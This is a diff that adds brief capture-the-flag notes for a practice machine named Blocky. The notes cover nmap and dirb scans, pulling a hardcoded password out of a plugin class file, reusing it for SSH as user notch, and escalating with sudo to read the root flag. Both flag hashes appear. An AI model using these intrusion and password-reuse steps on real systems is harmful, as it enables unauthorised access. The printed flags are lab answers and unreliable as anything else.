@@ -1,0 +1,33 @@
+nmap -sC -sV -oN nmap 10.10.10.37 -v -A
+
+start by looking at port 80 = website
+
+download RSS resources
+-> nothing in it
+
+dirb http://10.10.10.37
+-> wordpress
+-> http://10.10.10.37/plugins
+
+wpscan -> nothing
+
+http://10.10.10.37/plugins -> BlockyCore.class
+cat -> get root:8YsqfCTnvxAUeduzjNSXe22
+
+doesnt work in wp login
+
+dirb also shows php-my-admin -> creds are valid
+dunno what to do in php-my-admin panel
+
+saw Notch user on website
+-> ssh notch@10.10.10.37 with 8YsqfCTnvxAUeduzjNSXe22 -> user flag
+
+59fee0977fb60b8a0bc6e41e751f3cd5
+
+sudo -l
+`User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL`
+
+sudo cat /root/root.txt
+
+0a9694a5b4d272c694679f7860f1cd5f
